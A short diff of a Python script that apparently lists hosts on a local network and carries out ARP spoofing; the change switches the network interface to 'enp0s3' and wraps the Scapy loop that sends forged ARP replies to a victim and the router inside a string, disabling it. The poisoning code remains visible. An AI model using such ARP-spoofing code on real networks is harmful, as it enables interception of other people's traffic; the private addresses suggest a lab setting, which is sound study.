@@ -95,7 +95,7 @@ if __name__ == "__main__":
     # get ip without /24
     ip      = getHostIp()
     hostip  = ip 
-    hostmac = getHwAddr('wlo1')
+    hostmac = getHwAddr('enp0s3')
     routerIp = get_default_gateway_linux()
     routerMac = ""
 
@@ -150,6 +150,7 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
+"""
     victimpacket = ARP(op=2, pdst="192.168.1.101", hwdst="08:00:27:34:C8:8F",
                        psrc="192.168.1.1", hwsrc="08:00:27:25:A4:94")
     routerpacket = ARP(op=2, pdst="192.168.1.1", hwdst="38:6B:1C:C3:8C:68",
@@ -160,3 +161,4 @@ if __name__ == "__main__":
         send(victimpacket)
         send(routerpacket)
         sleep(2)
+"""
